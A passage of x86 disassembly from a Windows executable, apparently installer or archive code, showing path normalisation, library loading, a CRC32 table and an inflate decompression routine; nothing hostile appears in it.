  4064c4:	75 0e                	jne    0x4064d4
  4064c6:	ff 35 e8 ae 47 00    	push   0x47aee8
  4064cc:	56                   	push   %esi
  4064cd:	e8 2f fd ff ff       	call   0x406201
  4064d2:	eb 11                	jmp    0x4064e5
  4064d4:	8b c7                	mov    %edi,%eax
  4064d6:	c1 e0 0e             	shl    $0xe,%eax
  4064d9:	05 00 b0 47 00       	add    $0x47b000,%eax
  4064de:	50                   	push   %eax
  4064df:	56                   	push   %esi
  4064e0:	e8 d5 fd ff ff       	call   0x4062ba
  4064e5:	83 c7 eb             	add    $0xffffffeb,%edi
  4064e8:	83 ff 07             	cmp    $0x7,%edi
  4064eb:	73 15                	jae    0x406502
  4064ed:	eb c1                	jmp    0x4064b0
  4064ef:	66 83 ff 01          	cmp    $0x1,%di
  4064f3:	75 0d                	jne    0x406502
  4064f5:	83 c8 ff             	or     $0xffffffff,%eax
  4064f8:	2b 45 fc             	sub    -0x4(%ebp),%eax
  4064fb:	50                   	push   %eax
  4064fc:	56                   	push   %esi
  4064fd:	e8 da fd ff ff       	call   0x4062dc
  406502:	56                   	push   %esi
  406503:	e8 c8 fd ff ff       	call   0x4062d0
  406508:	8b 55 0c             	mov    0xc(%ebp),%edx
  40650b:	8d 34 46             	lea    (%esi,%eax,2),%esi
  40650e:	b8 80 ae 46 00       	mov    $0x46ae80,%eax
  406513:	eb 13                	jmp    0x406528
  406515:	75 0c                	jne    0x406523
  406517:	66 8b 3a             	mov    (%edx),%di
  40651a:	66 89 3e             	mov    %di,(%esi)
  40651d:	03 f1                	add    %ecx,%esi
  40651f:	03 d1                	add    %ecx,%edx
  406521:	eb 05                	jmp    0x406528
  406523:	66 89 3e             	mov    %di,(%esi)
  406526:	03 f1                	add    %ecx,%esi
  406528:	66 8b 3a             	mov    (%edx),%di
  40652b:	66 85 ff             	test   %di,%di
  40652e:	0f 85 01 fe ff ff    	jne    0x406335
  406534:	66 83 26 00          	andw   $0x0,(%esi)
  406538:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40653c:	5f                   	pop    %edi
  40653d:	5e                   	pop    %esi
  40653e:	5b                   	pop    %ebx
  40653f:	74 09                	je     0x40654a
  406541:	50                   	push   %eax
  406542:	ff 75 08             	push   0x8(%ebp)
  406545:	e8 70 fd ff ff       	call   0x4062ba
  40654a:	c9                   	leave
  40654b:	c2 08 00             	ret    $0x8
  40654e:	55                   	push   %ebp
  40654f:	56                   	push   %esi
  406550:	8b 74 24 0c          	mov    0xc(%esp),%esi
  406554:	57                   	push   %edi
  406555:	66 83 3e 5c          	cmpw   $0x5c,(%esi)
  406559:	75 18                	jne    0x406573
  40655b:	66 83 7e 02 5c       	cmpw   $0x5c,0x2(%esi)
  406560:	75 11                	jne    0x406573
  406562:	66 83 7e 04 3f       	cmpw   $0x3f,0x4(%esi)
  406567:	75 0a                	jne    0x406573
  406569:	66 83 7e 06 5c       	cmpw   $0x5c,0x6(%esi)
  40656e:	75 03                	jne    0x406573
  406570:	83 c6 08             	add    $0x8,%esi
  406573:	66 83 3e 00          	cmpw   $0x0,(%esi)
  406577:	74 0d                	je     0x406586
  406579:	56                   	push   %esi
  40657a:	e8 87 f6 ff ff       	call   0x405c06
  40657f:	85 c0                	test   %eax,%eax
  406581:	74 03                	je     0x406586
  406583:	83 c6 04             	add    $0x4,%esi
  406586:	66 8b 06             	mov    (%esi),%ax
  406589:	8b ee                	mov    %esi,%ebp
  40658b:	66 85 c0             	test   %ax,%ax
  40658e:	8b fe                	mov    %esi,%edi
  406590:	74 40                	je     0x4065d2
  406592:	53                   	push   %ebx
  406593:	8b 1d 48 82 40 00    	mov    0x408248,%ebx
  406599:	66 3d 1f 00          	cmp    $0x1f,%ax
  40659d:	76 25                	jbe    0x4065c4
  40659f:	50                   	push   %eax
  4065a0:	68 7c a5 40 00       	push   $0x40a57c
  4065a5:	e8 12 f6 ff ff       	call   0x405bbc
  4065aa:	66 83 38 00          	cmpw   $0x0,(%eax)
  4065ae:	75 14                	jne    0x4065c4
  4065b0:	56                   	push   %esi
  4065b1:	ff d3                	call   *%ebx
  4065b3:	2b c6                	sub    %esi,%eax
  4065b5:	d1 f8                	sar    $1,%eax
  4065b7:	50                   	push   %eax
  4065b8:	56                   	push   %esi
  4065b9:	57                   	push   %edi
  4065ba:	e8 ac f7 ff ff       	call   0x405d6b
  4065bf:	57                   	push   %edi
  4065c0:	ff d3                	call   *%ebx
  4065c2:	8b f8                	mov    %eax,%edi
  4065c4:	56                   	push   %esi
  4065c5:	ff d3                	call   *%ebx
  4065c7:	8b f0                	mov    %eax,%esi
  4065c9:	66 8b 06             	mov    (%esi),%ax
  4065cc:	66 85 c0             	test   %ax,%ax
  4065cf:	75 c8                	jne    0x406599
  4065d1:	5b                   	pop    %ebx
  4065d2:	66 83 27 00          	andw   $0x0,(%edi)
  4065d6:	57                   	push   %edi
  4065d7:	55                   	push   %ebp
  4065d8:	ff 15 f8 81 40 00    	call   *0x4081f8
  4065de:	8b f8                	mov    %eax,%edi
  4065e0:	66 8b 07             	mov    (%edi),%ax
  4065e3:	66 3d 20 00          	cmp    $0x20,%ax
  4065e7:	74 06                	je     0x4065ef
  4065e9:	66 3d 5c 00          	cmp    $0x5c,%ax
  4065ed:	75 08                	jne    0x4065f7
  4065ef:	66 83 27 00          	andw   $0x0,(%edi)
  4065f3:	3b ef                	cmp    %edi,%ebp
  4065f5:	72 df                	jb     0x4065d6
  4065f7:	5f                   	pop    %edi
  4065f8:	5e                   	pop    %esi
  4065f9:	5d                   	pop    %ebp
  4065fa:	c2 04 00             	ret    $0x4
  4065fd:	56                   	push   %esi
  4065fe:	be 98 82 46 00       	mov    $0x468298,%esi
  406603:	56                   	push   %esi
  406604:	ff 74 24 0c          	push   0xc(%esp)
  406608:	ff 15 38 81 40 00    	call   *0x408138
  40660e:	83 f8 ff             	cmp    $0xffffffff,%eax
  406611:	74 0b                	je     0x40661e
  406613:	50                   	push   %eax
  406614:	ff 15 4c 81 40 00    	call   *0x40814c
  40661a:	8b c6                	mov    %esi,%eax
  40661c:	eb 02                	jmp    0x406620
  40661e:	33 c0                	xor    %eax,%eax
  406620:	5e                   	pop    %esi
  406621:	c2 04 00             	ret    $0x4
  406624:	55                   	push   %ebp
  406625:	8b ec                	mov    %esp,%ebp
  406627:	81 ec 3c 02 00 00    	sub    $0x23c,%esp
  40662d:	56                   	push   %esi
  40662e:	be 04 01 00 00       	mov    $0x104,%esi
  406633:	8d 85 c4 fd ff ff    	lea    -0x23c(%ebp),%eax
  406639:	56                   	push   %esi
  40663a:	50                   	push   %eax
  40663b:	ff 15 f0 80 40 00    	call   *0x4080f0
  406641:	3b c6                	cmp    %esi,%eax
  406643:	5e                   	pop    %esi
  406644:	76 02                	jbe    0x406648
  406646:	33 c0                	xor    %eax,%eax
  406648:	85 c0                	test   %eax,%eax
  40664a:	74 0f                	je     0x40665b
  40664c:	66 83 bc 45 c2 fd ff 	cmpw   $0x5c,-0x23e(%ebp,%eax,2)
  406653:	ff 5c 
  406655:	74 04                	je     0x40665b
  406657:	33 c9                	xor    %ecx,%ecx
  406659:	eb 03                	jmp    0x40665e
  40665b:	33 c9                	xor    %ecx,%ecx
  40665d:	41                   	inc    %ecx
  40665e:	ff 75 08             	push   0x8(%ebp)
  406661:	8d 0c 4d 14 a0 40 00 	lea    0x40a014(,%ecx,2),%ecx
  406668:	8d 84 45 c4 fd ff ff 	lea    -0x23c(%ebp,%eax,2),%eax
  40666f:	51                   	push   %ecx
  406670:	68 90 a5 40 00       	push   $0x40a590
  406675:	50                   	push   %eax
  406676:	ff 15 90 82 40 00    	call   *0x408290
  40667c:	83 c4 10             	add    $0x10,%esp
  40667f:	8d 85 c4 fd ff ff    	lea    -0x23c(%ebp),%eax
  406685:	6a 08                	push   $0x8
  406687:	6a 00                	push   $0x0
  406689:	50                   	push   %eax
  40668a:	ff 15 6c 81 40 00    	call   *0x40816c
  406690:	c9                   	leave
  406691:	c2 04 00             	ret    $0x4
  406694:	8b 44 24 04          	mov    0x4(%esp),%eax
  406698:	56                   	push   %esi
  406699:	8b f0                	mov    %eax,%esi
  40669b:	57                   	push   %edi
  40669c:	c1 e6 03             	shl    $0x3,%esi
  40669f:	8b be e0 a3 40 00    	mov    0x40a3e0(%esi),%edi
  4066a5:	57                   	push   %edi
  4066a6:	ff 15 f8 80 40 00    	call   *0x4080f8
  4066ac:	85 c0                	test   %eax,%eax
  4066ae:	75 0a                	jne    0x4066ba
  4066b0:	57                   	push   %edi
  4066b1:	e8 6e ff ff ff       	call   0x406624
  4066b6:	85 c0                	test   %eax,%eax
  4066b8:	74 0f                	je     0x4066c9
  4066ba:	ff b6 e4 a3 40 00    	push   0x40a3e4(%esi)
  4066c0:	50                   	push   %eax
  4066c1:	ff 15 f4 80 40 00    	call   *0x4080f4
  4066c7:	eb 02                	jmp    0x4066cb
  4066c9:	33 c0                	xor    %eax,%eax
  4066cb:	5f                   	pop    %edi
  4066cc:	5e                   	pop    %esi
  4066cd:	c2 04 00             	ret    $0x4
  4066d0:	55                   	push   %ebp
  4066d1:	8b ec                	mov    %esp,%ebp
  4066d3:	83 ec 1c             	sub    $0x1c,%esp
  4066d6:	56                   	push   %esi
  4066d7:	8b 75 08             	mov    0x8(%ebp),%esi
  4066da:	57                   	push   %edi
  4066db:	8b 3d 08 82 40 00    	mov    0x408208,%edi
  4066e1:	eb 0a                	jmp    0x4066ed
  4066e3:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4066e6:	50                   	push   %eax
  4066e7:	ff 15 04 82 40 00    	call   *0x408204
  4066ed:	6a 01                	push   $0x1
  4066ef:	56                   	push   %esi
  4066f0:	56                   	push   %esi
  4066f1:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4066f4:	6a 00                	push   $0x0
  4066f6:	50                   	push   %eax
  4066f7:	ff d7                	call   *%edi
  4066f9:	85 c0                	test   %eax,%eax
  4066fb:	75 e6                	jne    0x4066e3
  4066fd:	5f                   	pop    %edi
  4066fe:	5e                   	pop    %esi
  4066ff:	c9                   	leave
  406700:	c2 04 00             	ret    $0x4
  406703:	55                   	push   %ebp
  406704:	8b ec                	mov    %esp,%ebp
  406706:	81 ec 00 01 00 00    	sub    $0x100,%esp
  40670c:	33 c0                	xor    %eax,%eax
  40670e:	8d 8d 00 ff ff ff    	lea    -0x100(%ebp),%ecx
  406714:	50                   	push   %eax
  406715:	50                   	push   %eax
  406716:	68 00 01 00 00       	push   $0x100
  40671b:	51                   	push   %ecx
  40671c:	6a ff                	push   $0xffffffff
  40671e:	ff 75 0c             	push   0xc(%ebp)
  406721:	50                   	push   %eax
  406722:	50                   	push   %eax
  406723:	ff 15 5c 81 40 00    	call   *0x40815c
  406729:	85 c0                	test   %eax,%eax
  40672b:	74 12                	je     0x40673f
  40672d:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
  406733:	50                   	push   %eax
  406734:	ff 75 08             	push   0x8(%ebp)
  406737:	ff 15 f4 80 40 00    	call   *0x4080f4
  40673d:	eb 02                	jmp    0x406741
  40673f:	33 c0                	xor    %eax,%eax
  406741:	c9                   	leave
  406742:	c2 08 00             	ret    $0x8
  406745:	55                   	push   %ebp
  406746:	8b ec                	mov    %esp,%ebp
  406748:	51                   	push   %ecx
  406749:	56                   	push   %esi
  40674a:	8b 35 00 81 40 00    	mov    0x408100,%esi
  406750:	57                   	push   %edi
  406751:	6a 64                	push   $0x64
  406753:	ff 75 08             	push   0x8(%ebp)
  406756:	ff d6                	call   *%esi
  406758:	bf 02 01 00 00       	mov    $0x102,%edi
  40675d:	eb 0e                	jmp    0x40676d
  40675f:	6a 0f                	push   $0xf
  406761:	e8 6a ff ff ff       	call   0x4066d0
  406766:	6a 64                	push   $0x64
  406768:	ff 75 08             	push   0x8(%ebp)
  40676b:	ff d6                	call   *%esi
  40676d:	3b c7                	cmp    %edi,%eax
  40676f:	74 ee                	je     0x40675f
  406771:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406774:	50                   	push   %eax
  406775:	ff 75 08             	push   0x8(%ebp)
  406778:	ff 15 fc 80 40 00    	call   *0x4080fc
  40677e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406781:	5f                   	pop    %edi
  406782:	5e                   	pop    %esi
  406783:	c9                   	leave
  406784:	c2 04 00             	ret    $0x4
  406787:	83 3d ec 98 46 00 00 	cmpl   $0x0,0x4698ec
  40678e:	56                   	push   %esi
  40678f:	75 2d                	jne    0x4067be
  406791:	33 c9                	xor    %ecx,%ecx
  406793:	6a 08                	push   $0x8
  406795:	8b c1                	mov    %ecx,%eax
  406797:	5e                   	pop    %esi
  406798:	8b d0                	mov    %eax,%edx
  40679a:	80 e2 01             	and    $0x1,%dl
  40679d:	f6 da                	neg    %dl
  40679f:	1b d2                	sbb    %edx,%edx
  4067a1:	81 e2 20 83 b8 ed    	and    $0xedb88320,%edx
  4067a7:	d1 e8                	shr    $1,%eax
  4067a9:	33 c2                	xor    %edx,%eax
  4067ab:	4e                   	dec    %esi
  4067ac:	75 ea                	jne    0x406798
  4067ae:	89 04 8d e8 98 46 00 	mov    %eax,0x4698e8(,%ecx,4)
  4067b5:	41                   	inc    %ecx
  4067b6:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  4067bc:	7c d5                	jl     0x406793
  4067be:	8b 54 24 10          	mov    0x10(%esp),%edx
  4067c2:	8b 44 24 08          	mov    0x8(%esp),%eax
  4067c6:	85 d2                	test   %edx,%edx
  4067c8:	f7 d0                	not    %eax
  4067ca:	76 23                	jbe    0x4067ef
  4067cc:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  4067d0:	57                   	push   %edi
  4067d1:	0f b6 39             	movzbl (%ecx),%edi
  4067d4:	8b f0                	mov    %eax,%esi
  4067d6:	81 e6 ff 00 00 00    	and    $0xff,%esi
  4067dc:	33 f7                	xor    %edi,%esi
  4067de:	c1 e8 08             	shr    $0x8,%eax
  4067e1:	8b 34 b5 e8 98 46 00 	mov    0x4698e8(,%esi,4),%esi
  4067e8:	33 c6                	xor    %esi,%eax
  4067ea:	41                   	inc    %ecx
  4067eb:	4a                   	dec    %edx
  4067ec:	75 e3                	jne    0x4067d1
  4067ee:	5f                   	pop    %edi
  4067ef:	f7 d0                	not    %eax
  4067f1:	5e                   	pop    %esi
  4067f2:	c2 0c 00             	ret    $0xc
  4067f5:	55                   	push   %ebp
  4067f6:	8b ec                	mov    %esp,%ebp
  4067f8:	83 ec 44             	sub    $0x44,%esp
  4067fb:	8b 45 08             	mov    0x8(%ebp),%eax
  4067fe:	53                   	push   %ebx
  4067ff:	56                   	push   %esi
  406800:	57                   	push   %edi
  406801:	8b 08                	mov    (%eax),%ecx
  406803:	8d 70 10             	lea    0x10(%eax),%esi
  406806:	8b 40 04             	mov    0x4(%eax),%eax
  406809:	89 4d c8             	mov    %ecx,-0x38(%ebp)
  40680c:	8b 8e a8 9b 00 00    	mov    0x9ba8(%esi),%ecx
  406812:	8b 9e 18 05 00 00    	mov    0x518(%esi),%ebx
  406818:	89 45 cc             	mov    %eax,-0x34(%ebp)
  40681b:	8b 86 1c 05 00 00    	mov    0x51c(%esi),%eax
  406821:	89 45 c0             	mov    %eax,-0x40(%ebp)
  406824:	8b 86 a4 9b 00 00    	mov    0x9ba4(%esi),%eax
  40682a:	3b c8                	cmp    %eax,%ecx
  40682c:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  40682f:	73 05                	jae    0x406836
  406831:	2b c1                	sub    %ecx,%eax
  406833:	48                   	dec    %eax
  406834:	eb 08                	jmp    0x40683e
  406836:	8b 86 a0 9b 00 00    	mov    0x9ba0(%esi),%eax
  40683c:	2b c1                	sub    %ecx,%eax
  40683e:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  406841:	e9 c3 09 00 00       	jmp    0x407209
  406846:	ff 24 85 44 72 40 00 	jmp    *0x407244(,%eax,4)
  40684d:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  406851:	0f 84 c2 09 00 00    	je     0x407219
  406857:	8b 45 c8             	mov    -0x38(%ebp),%eax
  40685a:	ff 4d cc             	decl   -0x34(%ebp)
  40685d:	8b cb                	mov    %ebx,%ecx
  40685f:	0f b6 00             	movzbl (%eax),%eax
  406862:	d3 e0                	shl    %cl,%eax
  406864:	09 45 c0             	or     %eax,-0x40(%ebp)
  406867:	ff 45 c8             	incl   -0x38(%ebp)
  40686a:	83 c3 08             	add    $0x8,%ebx
  40686d:	83 fb 03             	cmp    $0x3,%ebx
  406870:	72 db                	jb     0x40684d
  406872:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406875:	83 eb 03             	sub    $0x3,%ebx
  406878:	c1 6d c0 03          	shrl   $0x3,-0x40(%ebp)
  40687c:	83 e0 07             	and    $0x7,%eax
  40687f:	8b c8                	mov    %eax,%ecx
  406881:	80 e1 01             	and    $0x1,%cl
  406884:	f6 d9                	neg    %cl
  406886:	1b c9                	sbb    %ecx,%ecx
  406888:	83 e1 07             	and    $0x7,%ecx
  40688b:	d1 e8                	shr    $1,%eax
  40688d:	83 c1 08             	add    $0x8,%ecx
  406890:	83 e8 00             	sub    $0x0,%eax
  406893:	89 8e 14 05 00 00    	mov    %ecx,0x514(%esi)
  406899:	0f 84 2e 01 00 00    	je     0x4069cd
  40689f:	48                   	dec    %eax
  4068a0:	74 56                	je     0x4068f8
  4068a2:	48                   	dec    %eax
  4068a3:	74 48                	je     0x4068ed
  4068a5:	48                   	dec    %eax
  4068a6:	0f 85 5d 09 00 00    	jne    0x407209
  4068ac:	83 cf ff             	or     $0xffffffff,%edi
  4068af:	c7 06 11 00 00 00    	movl   $0x11,(%esi)
  4068b5:	8b 45 c0             	mov    -0x40(%ebp),%eax
  4068b8:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4068bb:	89 86 1c 05 00 00    	mov    %eax,0x51c(%esi)
  4068c1:	8b 45 cc             	mov    -0x34(%ebp),%eax
  4068c4:	89 9e 18 05 00 00    	mov    %ebx,0x518(%esi)
  4068ca:	89 41 04             	mov    %eax,0x4(%ecx)
  4068cd:	8b 45 08             	mov    0x8(%ebp),%eax
  4068d0:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  4068d3:	50                   	push   %eax
  4068d4:	89 08                	mov    %ecx,(%eax)
  4068d6:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  4068d9:	89 8e a8 9b 00 00    	mov    %ecx,0x9ba8(%esi)
  4068df:	e8 a0 09 00 00       	call   0x407284
  4068e4:	8b c7                	mov    %edi,%eax
  4068e6:	5f                   	pop    %edi
  4068e7:	5e                   	pop    %esi
  4068e8:	5b                   	pop    %ebx
  4068e9:	c9                   	leave
  4068ea:	c2 04 00             	ret    $0x4
  4068ed:	c7 06 0b 00 00 00    	movl   $0xb,(%esi)
  4068f3:	e9 11 09 00 00       	jmp    0x407209
  4068f8:	80 3d 70 ae 46 00 00 	cmpb   $0x0,0x46ae70
  4068ff:	0f 85 a0 00 00 00    	jne    0x4069a5
  406905:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  406909:	b8 f0 9c 46 00       	mov    $0x469cf0,%eax
  40690e:	3d 2c 9f 46 00       	cmp    $0x469f2c,%eax
  406913:	b1 08                	mov    $0x8,%cl
  406915:	7e 14                	jle    0x40692b
  406917:	3d f0 a0 46 00       	cmp    $0x46a0f0,%eax
  40691c:	7d 04                	jge    0x406922
  40691e:	fe c1                	inc    %cl
  406920:	eb 09                	jmp    0x40692b
  406922:	3d 50 a1 46 00       	cmp    $0x46a150,%eax
  406927:	7d 02                	jge    0x40692b
  406929:	b1 07                	mov    $0x7,%cl
  40692b:	0f be c9             	movsbl %cl,%ecx
  40692e:	89 08                	mov    %ecx,(%eax)
  406930:	83 c0 04             	add    $0x4,%eax
  406933:	3d 70 a1 46 00       	cmp    $0x46a170,%eax
  406938:	7c d4                	jl     0x40690e
  40693a:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40693d:	bf f0 9c 46 00       	mov    $0x469cf0,%edi
  406942:	50                   	push   %eax
  406943:	68 f0 a5 46 00       	push   $0x46a5f0
  406948:	68 c8 a5 40 00       	push   $0x40a5c8
  40694d:	68 ec 9c 46 00       	push   $0x469cec
  406952:	68 28 85 40 00       	push   $0x408528
  406957:	68 e8 84 40 00       	push   $0x4084e8
  40695c:	68 01 01 00 00       	push   $0x101
  406961:	68 20 01 00 00       	push   $0x120
  406966:	57                   	push   %edi
  406967:	e8 80 09 00 00       	call   0x4072ec
  40696c:	6a 1e                	push   $0x1e
  40696e:	59                   	pop    %ecx
  40696f:	6a 05                	push   $0x5
  406971:	58                   	pop    %eax
  406972:	f3 ab                	rep stos %eax,%es:(%edi)
  406974:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406977:	50                   	push   %eax
  406978:	68 f0 a5 46 00       	push   $0x46a5f0
  40697d:	68 cc a5 40 00       	push   $0x40a5cc
  406982:	68 e8 9c 46 00       	push   $0x469ce8
  406987:	68 a4 85 40 00       	push   $0x4085a4
  40698c:	68 68 85 40 00       	push   $0x408568
  406991:	6a 00                	push   $0x0
  406993:	6a 1e                	push   $0x1e
  406995:	68 f0 9c 46 00       	push   $0x469cf0
  40699a:	e8 4d 09 00 00       	call   0x4072ec
  40699f:	fe 05 70 ae 46 00    	incb   0x46ae70
  4069a5:	a0 c8 a5 40 00       	mov    0x40a5c8,%al
  4069aa:	88 46 10             	mov    %al,0x10(%esi)
  4069ad:	a0 cc a5 40 00       	mov    0x40a5cc,%al
  4069b2:	88 46 11             	mov    %al,0x11(%esi)
  4069b5:	a1 ec 9c 46 00       	mov    0x469cec,%eax
  4069ba:	89 46 14             	mov    %eax,0x14(%esi)
  4069bd:	a1 e8 9c 46 00       	mov    0x469ce8,%eax
  4069c2:	89 46 18             	mov    %eax,0x18(%esi)
  4069c5:	83 26 00             	andl   $0x0,(%esi)
  4069c8:	e9 3c 08 00 00       	jmp    0x407209
  4069cd:	8b cb                	mov    %ebx,%ecx
  4069cf:	c7 06 09 00 00 00    	movl   $0x9,(%esi)
  4069d5:	83 e1 07             	and    $0x7,%ecx
  4069d8:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  4069db:	2b d9                	sub    %ecx,%ebx
  4069dd:	e9 27 08 00 00       	jmp    0x407209
  4069e2:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  4069e6:	0f 84 2d 08 00 00    	je     0x407219
  4069ec:	8b 45 c8             	mov    -0x38(%ebp),%eax
  4069ef:	ff 4d cc             	decl   -0x34(%ebp)
  4069f2:	8b cb                	mov    %ebx,%ecx
  4069f4:	0f b6 00             	movzbl (%eax),%eax
  4069f7:	d3 e0                	shl    %cl,%eax
  4069f9:	09 45 c0             	or     %eax,-0x40(%ebp)
  4069fc:	ff 45 c8             	incl   -0x38(%ebp)
  4069ff:	83 c3 08             	add    $0x8,%ebx
  406a02:	83 fb 20             	cmp    $0x20,%ebx
  406a05:	72 db                	jb     0x4069e2
  406a07:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406a0a:	33 db                	xor    %ebx,%ebx
  406a0c:	25 ff ff 00 00       	and    $0xffff,%eax
  406a11:	89 5d c0             	mov    %ebx,-0x40(%ebp)
  406a14:	3b c3                	cmp    %ebx,%eax
  406a16:	89 46 04             	mov    %eax,0x4(%esi)
  406a19:	0f 84 e9 00 00 00    	je     0x406b08
  406a1f:	6a 0a                	push   $0xa
  406a21:	58                   	pop    %eax
  406a22:	e9 e7 00 00 00       	jmp    0x406b0e
  406a27:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  406a2b:	0f 84 e8 07 00 00    	je     0x407219
  406a31:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  406a34:	85 c0                	test   %eax,%eax
  406a36:	0f 85 98 00 00 00    	jne    0x406ad4
  406a3c:	8b 8e a0 9b 00 00    	mov    0x9ba0(%esi),%ecx
  406a42:	8b 55 d0             	mov    -0x30(%ebp),%edx
  406a45:	3b d1                	cmp    %ecx,%edx
  406a47:	75 29                	jne    0x406a72
  406a49:	8b 86 a4 9b 00 00    	mov    0x9ba4(%esi),%eax
  406a4f:	8d be a0 1b 00 00    	lea    0x1ba0(%esi),%edi
  406a55:	3b c7                	cmp    %edi,%eax
  406a57:	74 19                	je     0x406a72
  406a59:	8b d7                	mov    %edi,%edx
  406a5b:	3b d0                	cmp    %eax,%edx
  406a5d:	89 55 d0             	mov    %edx,-0x30(%ebp)
  406a60:	73 05                	jae    0x406a67
  406a62:	2b c2                	sub    %edx,%eax
  406a64:	48                   	dec    %eax
  406a65:	eb 04                	jmp    0x406a6b
  406a67:	2b ca                	sub    %edx,%ecx
  406a69:	8b c1                	mov    %ecx,%eax
  406a6b:	85 c0                	test   %eax,%eax
  406a6d:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  406a70:	75 62                	jne    0x406ad4
  406a72:	ff 75 08             	push   0x8(%ebp)
  406a75:	89 96 a8 9b 00 00    	mov    %edx,0x9ba8(%esi)
  406a7b:	e8 04 08 00 00       	call   0x407284
  406a80:	8b 96 a8 9b 00 00    	mov    0x9ba8(%esi),%edx
  406a86:	8b 8e a4 9b 00 00    	mov    0x9ba4(%esi),%ecx
  406a8c:	3b d1                	cmp    %ecx,%edx
  406a8e:	89 55 d0             	mov    %edx,-0x30(%ebp)
  406a91:	73 07                	jae    0x406a9a
  406a93:	8b c1                	mov    %ecx,%eax
  406a95:	2b c2                	sub    %edx,%eax
  406a97:	48                   	dec    %eax
  406a98:	eb 08                	jmp    0x406aa2
  406a9a:	8b 86 a0 9b 00 00    	mov    0x9ba0(%esi),%eax
  406aa0:	2b c2                	sub    %edx,%eax
  406aa2:	8b be a0 9b 00 00    	mov    0x9ba0(%esi),%edi
  406aa8:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  406aab:	3b d7                	cmp    %edi,%edx
  406aad:	75 1d                	jne    0x406acc
  406aaf:	8d 96 a0 1b 00 00    	lea    0x1ba0(%esi),%edx
  406ab5:	3b d1                	cmp    %ecx,%edx
  406ab7:	74 13                	je     0x406acc
  406ab9:	89 55 d0             	mov    %edx,-0x30(%ebp)
  406abc:	73 07                	jae    0x406ac5
  406abe:	2b ca                	sub    %edx,%ecx
  406ac0:	49                   	dec    %ecx
  406ac1:	8b c1                	mov    %ecx,%eax
  406ac3:	eb 04                	jmp    0x406ac9
  406ac5:	2b fa                	sub    %edx,%edi
  406ac7:	8b c7                	mov    %edi,%eax
  406ac9:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  406acc:	85 c0                	test   %eax,%eax
  406ace:	0f 84 61 07 00 00    	je     0x407235
  406ad4:	3b 45 cc             	cmp    -0x34(%ebp),%eax
  406ad7:	72 03                	jb     0x406adc
  406ad9:	8b 45 cc             	mov    -0x34(%ebp),%eax
  406adc:	8b 4e 04             	mov    0x4(%esi),%ecx
  406adf:	3b c8                	cmp    %eax,%ecx
  406ae1:	8b f9                	mov    %ecx,%edi
  406ae3:	72 02                	jb     0x406ae7
  406ae5:	8b f8                	mov    %eax,%edi
  406ae7:	57                   	push   %edi
  406ae8:	ff 75 c8             	push   -0x38(%ebp)
  406aeb:	ff 75 d0             	push   -0x30(%ebp)
  406aee:	e8 78 f2 ff ff       	call   0x405d6b
  406af3:	01 7d c8             	add    %edi,-0x38(%ebp)
  406af6:	29 7d cc             	sub    %edi,-0x34(%ebp)
  406af9:	01 7d d0             	add    %edi,-0x30(%ebp)
  406afc:	29 7d d4             	sub    %edi,-0x2c(%ebp)
  406aff:	29 7e 04             	sub    %edi,0x4(%esi)
  406b02:	0f 85 01 07 00 00    	jne    0x407209
  406b08:	8b 86 14 05 00 00    	mov    0x514(%esi),%eax
  406b0e:	89 06                	mov    %eax,(%esi)
  406b10:	e9 f4 06 00 00       	jmp    0x407209
  406b15:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  406b19:	0f 84 fa 06 00 00    	je     0x407219
  406b1f:	8b 45 c8             	mov    -0x38(%ebp),%eax
  406b22:	ff 4d cc             	decl   -0x34(%ebp)
  406b25:	8b cb                	mov    %ebx,%ecx
  406b27:	0f b6 00             	movzbl (%eax),%eax
  406b2a:	d3 e0                	shl    %cl,%eax
  406b2c:	09 45 c0             	or     %eax,-0x40(%ebp)
  406b2f:	ff 45 c8             	incl   -0x38(%ebp)
  406b32:	83 c3 08             	add    $0x8,%ebx
  406b35:	83 fb 0e             	cmp    $0xe,%ebx
  406b38:	72 db                	jb     0x406b15
  406b3a:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406b3d:	25 ff 3f 00 00       	and    $0x3fff,%eax
  406b42:	8b c8                	mov    %eax,%ecx
  406b44:	89 46 04             	mov    %eax,0x4(%esi)
  406b47:	83 e1 1f             	and    $0x1f,%ecx
  406b4a:	80 f9 1d             	cmp    $0x1d,%cl
  406b4d:	0f 87 59 fd ff ff    	ja     0x4068ac
  406b53:	25 e0 03 00 00       	and    $0x3e0,%eax
  406b58:	3d a0 03 00 00       	cmp    $0x3a0,%eax
  406b5d:	0f 87 49 fd ff ff    	ja     0x4068ac
  406b63:	c1 6d c0 0e          	shrl   $0xe,-0x40(%ebp)
  406b67:	83 eb 0e             	sub    $0xe,%ebx
  406b6a:	83 66 08 00          	andl   $0x0,0x8(%esi)
  406b6e:	c7 06 0c 00 00 00    	movl   $0xc,(%esi)
  406b74:	8b 46 04             	mov    0x4(%esi),%eax
  406b77:	c1 e8 0a             	shr    $0xa,%eax
  406b7a:	83 c0 04             	add    $0x4,%eax
  406b7d:	39 46 08             	cmp    %eax,0x8(%esi)
  406b80:	73 69                	jae    0x406beb
  406b82:	eb 20                	jmp    0x406ba4
  406b84:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
